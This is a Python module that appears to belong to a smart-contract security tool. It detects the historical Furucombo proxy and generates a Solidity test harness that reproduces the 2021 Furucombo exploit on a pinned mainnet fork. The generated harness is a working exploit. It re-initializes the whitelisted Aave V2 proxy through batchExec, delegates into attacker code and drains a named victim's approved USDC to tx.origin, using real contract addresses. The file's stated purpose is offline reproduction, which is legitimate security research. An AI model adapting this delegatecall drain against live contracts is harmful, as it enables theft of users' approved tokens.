"""Furucombo historical delegatecall/proxy-storage mapper.

The historical Furucombo issue is not a generic missing-owner bug. It combines
public `batchExec`, a handler registry, `delegatecall`, and a whitelisted
initializable proxy handler. The local harness reproduces that historical
composition on a pinned fork and never broadcasts.
"""

from __future__ import annotations

from typing import Any


FURUCOMBO_VULNERABLE_PROXY = "0x17e8Ca1b4798B97602895f63206afCd1Fc90Ca5f"
FURUCOMBO_REDEPLOYED_PROXY = "0xA013AfbB9A92cEF49e898C87C060e6660E050569"
FURUCOMBO_AAVE_V2_PROXY = "0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9"
FURUCOMBO_USDC = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"
FURUCOMBO_USDC_VICTIM = "0x13f6f084e5fadED2276def5149E71811A7AbEb69"
FURUCOMBO_FORK_BLOCK = 11_940_499
HANDLER_REGISTRY_SLOT = "0x6874162fd62902201ea0f4bf541086067b3b88bd802fac9e150fd2d1db584e19"


def evaluate_furucombo_delegatecall_proxy_storage(source_manifest: dict[str, Any]) -> dict[str, Any]:
    source_text = _source_text(source_manifest)
    abi = _effective_abi(source_manifest)
    target = _target_address(source_manifest)
    source_shape = _has_furucombo_source_shape(source_text, abi)
    exact_vulnerable_target = target == FURUCOMBO_VULNERABLE_PROXY.lower()
    post_mortem_redeploy = target == FURUCOMBO_REDEPLOYED_PROXY.lower()

    blockers: list[str] = []
    if not source_shape:
        blockers.append("furucombo_batch_exec_delegatecall_shape_missing")
    if not exact_vulnerable_target:
        blockers.append("historical_vulnerable_proxy_target_required")
    if post_mortem_redeploy:
        blockers.append("post_mortem_redeployed_proxy_no_historical_runtime_claim")

    verified = not blockers
    missing = [] if verified else [
        "source_truth_guard_gap",
        "actor_model",
        "codable_args",
        "measurable_reader",
        "measurable_delta",
        "explicit_predicate",
    ]
    return {
        "verified": verified,
        "blockers": blockers,
        "source_shape_verified": source_shape,
        "post_mortem_redeploy": post_mortem_redeploy,
        "contract_name": "Furucombo Proxy",
        "proxy_address": FURUCOMBO_VULNERABLE_PROXY if exact_vulnerable_target else target,
        "actor_model": "any_external_caller_with_victim_token_allowance_and_whitelisted_nested_proxy_handler",
        "codable_args": [],
        "missing_proof_pieces": missing,
        "runtime_runner": "furucombo_delegatecall_runtime",
        "fork_block_number": FURUCOMBO_FORK_BLOCK,
        "runtime_strategy": "historical_fork_whitelisted_proxy_double_delegatecall",
        "runtime_components": [
            "handler_registry_slot_reader",
            "aave_v2_proxy_whitelist_probe",
            "proxy_context_transfer_from_assertion",
        ],
        "measurable_reader": "USDC.balanceOf(victim), USDC.allowance(victim, FurucomboProxy), registry.isValid(AaveV2Proxy)",
        "measurable_delta": (
            "After setup through batchExec(AaveV2Proxy.initialize(attacker)), a second batchExec through "
            "AaveV2Proxy delegates into attacker code and transfers USDC from a victim allowance."
        ),
        "explicit_predicate": (
            "At the pinned historical fork block, Furucombo public batchExec plus a whitelisted Aave V2 proxy "
            "permits nested delegatecall under Furucombo proxy authority and drains a victim-approved token."
        ),
        "evidence_kind": "furucombo_delegatecall_proxy_storage_confusion",
        "evidence_refs": _evidence_refs(source_shape, exact_vulnerable_target, post_mortem_redeploy),
    }


def should_use_furucombo_harness(source_manifest: dict[str, Any]) -> bool:
    return bool(evaluate_furucombo_delegatecall_proxy_storage(source_manifest).get("verified"))


def furucombo_fork(source_manifest: dict[str, Any]) -> dict[str, Any]:
    if should_use_furucombo_harness(source_manifest):
        return {"block_number": FURUCOMBO_FORK_BLOCK, "requires_rpc_url": True}
    return {}


def render_furucombo_harness(source_manifest: dict[str, Any]) -> str:
    evaluation = evaluate_furucombo_delegatecall_proxy_storage(source_manifest)
    predicate = str(evaluation.get("explicit_predicate") or "furucombo delegatecall runtime predicate")
    return "\n".join(
        [
            "// SPDX-License-Identifier: MIT",
            "pragma solidity ^0.8.24;",
            "",
            "interface IFurucomboProxy {",
            "    function batchExec(address[] calldata tos, bytes32[] calldata configs, bytes[] calldata datas) external payable;",
            "}",
            "",
            "interface IAaveV2Proxy {",
            "    function initialize(address logic, bytes calldata data) external payable;",
            "}",
            "",
            "interface IERC20Like {",
            "    function balanceOf(address account) external view returns (uint256);",
            "    function allowance(address owner, address spender) external view returns (uint256);",
            "    function transferFrom(address from, address to, uint256 amount) external returns (bool);",
            "}",
            "",
            "interface IRegistryLike {",
            "    function isValid(address handler) external view returns (bool);",
            "}",
            "",
            "interface Vm {",
            "    function load(address target, bytes32 slot) external view returns (bytes32);",
            "}",
            "",
            "contract VassagoSC01Harness {",
            "    Vm constant vm = Vm(address(uint160(uint256(keccak256(\"hevm cheat code\")))));",
            f"    IFurucomboProxy constant furucombo = IFurucomboProxy({FURUCOMBO_VULNERABLE_PROXY});",
            f"    address constant AAVE_V2_PROXY = {FURUCOMBO_AAVE_V2_PROXY};",
            f"    IERC20Like constant USDC = IERC20Like({FURUCOMBO_USDC});",
            f"    address constant VICTIM = {FURUCOMBO_USDC_VICTIM};",
            f"    bytes32 constant HANDLER_REGISTRY_SLOT = {HANDLER_REGISTRY_SLOT};",
            f'    string constant PREDICATE = "{_escape_solidity_string(predicate)}";',
            "",
            "    function testFurucomboWhitelistedProxyDelegatecallDrainsVictimAllowance() external {",
            "        address registry = address(uint160(uint256(vm.load(address(furucombo), HANDLER_REGISTRY_SLOT))));",
            "        require(registry != address(0), \"registry missing\");",
            "        require(IRegistryLike(registry).isValid(AAVE_V2_PROXY), \"aave proxy not valid handler\");",
            "",
            "        uint256 victimBefore = USDC.balanceOf(VICTIM);",
            "        uint256 originBefore = USDC.balanceOf(tx.origin);",
            "        uint256 allowance = USDC.allowance(VICTIM, address(furucombo));",
            "        require(victimBefore > 0, \"victim balance missing\");",
            "        require(allowance >= victimBefore, \"victim allowance insufficient\");",
            "",
            "        _batch(AAVE_V2_PROXY, abi.encodeWithSelector(IAaveV2Proxy.initialize.selector, address(this), bytes(\"\")));",
            "        _batch(AAVE_V2_PROXY, abi.encodeWithSelector(this.attackDelegated.selector, address(USDC), VICTIM));",
            "",
            "        uint256 victimAfter = USDC.balanceOf(VICTIM);",
            "        uint256 originAfter = USDC.balanceOf(tx.origin);",
            "        require(victimAfter < victimBefore, \"victim balance unchanged\");",
            "        require(originAfter > originBefore, \"origin balance unchanged\");",
            "    }",
            "",
            "    function attackDelegated(IERC20Like token, address victim) external payable {",
            "        uint256 amount = token.balanceOf(victim);",
            "        require(token.transferFrom(victim, tx.origin, amount), \"transferFrom failed\");",
            "    }",
            "",
            "    function _batch(address to, bytes memory data) internal {",
            "        address[] memory tos = new address[](1);",
            "        bytes32[] memory configs = new bytes32[](1);",
            "        bytes[] memory datas = new bytes[](1);",
            "        tos[0] = to;",
            "        datas[0] = data;",
            "        furucombo.batchExec(tos, configs, datas);",
            "    }",
            "}",
            "",
        ]
    )


def _source_text(source_manifest: dict[str, Any]) -> str:
    values = [str(value) for value in (source_manifest.get("source_files") or {}).values()]
    related = source_manifest.get("related_sources")
    if isinstance(related, dict):
        for item in related.values():
            if isinstance(item, dict):
                values.extend(str(value) for value in (item.get("source_files") or {}).values())
    return "\n".join(values)


def _effective_abi(source_manifest: dict[str, Any]) -> list[dict[str, Any]]:
    abi = list(source_manifest.get("abi") or [])
    related = source_manifest.get("related_sources")
    if isinstance(related, dict):
        for item in related.values():
            if isinstance(item, dict) and item.get("status") == "resolved":
                abi.extend(list(item.get("abi") or []))
    return abi


def _target_address(source_manifest: dict[str, Any]) -> str:
    target = source_manifest.get("target")
    if isinstance(target, dict):
        return str(target.get("address") or "").lower()
    return str(source_manifest.get("address") or "").lower()


def _abi_function(abi: list[dict[str, Any]], name: str) -> dict[str, Any] | None:
    for item in abi:
        if item.get("type") == "function" and item.get("name") == name:
            return item
    return None


def _has_furucombo_source_shape(source_text: str, abi: list[dict[str, Any]]) -> bool:
    return (
        (_abi_function(abi, "batchExec") is not None or "function batchExec" in source_text)
        and (_abi_function(abi, "execs") is not None or "function execs" in source_text)
        and "HANDLER_REGISTRY" in source_text
        and "IRegistry(_getRegistry()).isValid(handler)" in source_text
        and "delegatecall(" in source_text
        and "function _exec(address _to, bytes memory _data)" in source_text
    )


def _evidence_refs(source_shape: bool, exact_target: bool, redeploy: bool) -> list[str]:
    refs = [
        "source:batchExec(address[],bytes32[],bytes[])",
        "source:_exec delegatecall",
        "source:handler registry isValid check",
        "runtime:pinned historical fork required",
    ]
    if source_shape:
        refs.append("source:furucombo proxy shape")
    if exact_target:
        refs.append("target:furucombo vulnerable proxy 0x17e8ca1b4798b97602895f63206afcd1fc90ca5f")
    if redeploy:
        refs.append("target:furucombo post-mortem redeployed proxy 0xa013afbb9a92cef49e898c87c060e6660e050569")
    return refs


def _escape_solidity_string(value: str) -> str:
    return value.replace("\\", "\\\\").replace('"', '\\"')
